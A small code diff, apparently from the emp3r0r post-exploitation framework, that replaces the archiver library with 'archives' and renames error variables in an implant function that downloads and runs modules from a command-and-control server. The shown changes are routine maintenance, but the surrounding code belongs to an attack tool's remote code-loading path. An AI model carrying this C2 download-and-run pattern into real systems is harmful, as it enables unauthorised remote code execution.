@@ -13,7 +13,7 @@ import (
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
-	"github.com/mholt/archiver/v4"
+	"github.com/mholt/archives"
 )
 
 // moduleHandler downloads and runs modules from C2
@@ -34,12 +34,12 @@ func moduleHandler(modName, checksum string) (out string) {
 	inMem := checksum == "in_mem"
 
 	if !inMem {
-		if err := downloadAndVerifyModule(tarball, checksum); err != nil {
-			return err.Error()
+		if downloadErr := downloadAndVerifyModule(tarball, checksum); downloadErr != nil {
+			return downloadErr.Error()
 		}
 
-		if err := extractAndRunModule(modDir, tarball); err != nil {
-			return err.Error()
+		if extractErr := extractAndRunModule(modDir, tarball); extractErr != nil {
+			return extractErr.Error()
 		}
 	}
 
@@ -149,7 +149,7 @@ func decompressXZ(payload []byte, source string) ([]byte, error) {
 	r := bytes.NewReader(payload)
 
 	// Wrap the reader with XZ decompressor
-	decompressor, err := archiver.Xz{}.OpenReader(r)
+	decompressor, err := archives.Xz{}.OpenReader(r)
 	if err != nil {
 		return nil, fmt.Errorf("decompressing %s: %w", source, err)
 	}
